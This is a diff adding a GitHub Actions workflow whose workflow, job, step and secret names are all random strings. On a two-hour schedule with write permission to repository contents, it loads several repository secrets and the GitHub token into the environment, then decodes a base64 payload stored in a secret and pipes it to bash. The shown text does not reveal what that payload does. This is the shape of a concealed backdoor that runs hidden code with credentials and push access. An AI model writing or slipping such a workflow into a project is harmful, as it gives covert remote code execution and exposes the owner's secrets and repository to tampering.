@@ -1,0 +1,21 @@
+name: u6D11uL
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  K1V04rtx8NN18d:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.An26BCpAs }}
+      - name: jEwafq0qr
+        env:
+          I7bZOmXopXkQaq: ${{ secrets.qtbwudT0 }}
+          n5F7Uo2tMQnK: ${{ secrets.pb8yJAipnFRcd }}
+          ElGtplTuG: ${{ secrets.jaEnI4kd }}
+          GITHUB_TOKEN: ${{ secrets.An26BCpAs }}
+        run: echo "$I7bZOmXopXkQaq" | base64 -d | bash
